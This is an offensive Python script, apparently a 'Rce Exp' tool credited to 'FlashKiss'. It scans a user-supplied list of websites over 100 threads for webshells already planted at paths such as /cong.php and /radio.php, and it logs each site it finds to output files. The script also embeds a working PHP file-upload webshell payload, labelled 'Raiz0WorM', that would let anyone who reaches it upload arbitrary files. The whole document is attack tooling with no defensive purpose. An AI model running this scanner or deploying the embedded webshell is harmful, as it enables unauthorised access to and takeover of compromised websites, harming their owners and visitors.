import sys
import requests
import re
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)

fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA

logo = fg + """
                ____            _____            
                |  _ \\ ___ ___  | ____|_  ___ __  
                | |_) / __/ _ \\ |  _| \\ \\/ / '_ \\ 
                |  _ < (_|  __/ | |___ >  <| |_) |
                |_| \\_\\___\\___| |_____/_/\\_\\ .__/ 
                                            |_|  
                           FlashKiss 
                Telegram : https://t.me/flash_kiss



"""
print(logo)
shell = """<?php echo "Raiz0WorM"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""

requests.urllib3.disable_warnings()
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

try:
    with open(sys.argv[1], mode='r') as f:
        target = [i.strip() for i in f.readlines()]
except IndexError:
    path = str(sys.argv[0]).split('/')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def URLdomain(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    else:
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern, site):
        sitez = re.findall(pattern, site)
        site = sitez[0]
    return site

def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/cong.php', headers=headers, allow_redirects=True, timeout=15)
        if 'Mr.Combet WebShell' in check.content.decode():
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            with open('cong-Shells.txt', 'a') as f:
                f.write(url + '/cong.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/st.php', headers=headers, allow_redirects=True, verify=False, timeout=15)
            if 'Uname:' in check.content.decode():
                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
                with open('wso-Shells.txt', 'a') as f:
                    f.write(url + '/st.php\n')
            else:
                print(' -| ' + url + ' --> {}[Failed]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url + '/css/index.php', headers=headers, allow_redirects=True, timeout=15)
        if 'L I E R SHELL' in check.content.decode():
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            with open('ex-Shells.txt', 'a') as f:
                f.write(url + '/css/index.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/radio.php', headers=headers, allow_redirects=True, verify=False, timeout=15)
            if 'BlackDragon' in check.content.decode():
                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
                with open('re-Shells.txt', 'a') as f:
                    f.write(url + '/radio.php\n')
            else:
                print(' -| ' + url + ' --> {}[Failed]'.format(fr))
    except Exception as e:
        print(' -| ' + url + ' --> {}[Failed]'.format(fr))

mp = Pool(100)
mp.map(FourHundredThree, target)
mp.close()
mp.join()

print('\n [!] {}Saved in Shells.txt'.format(fc))
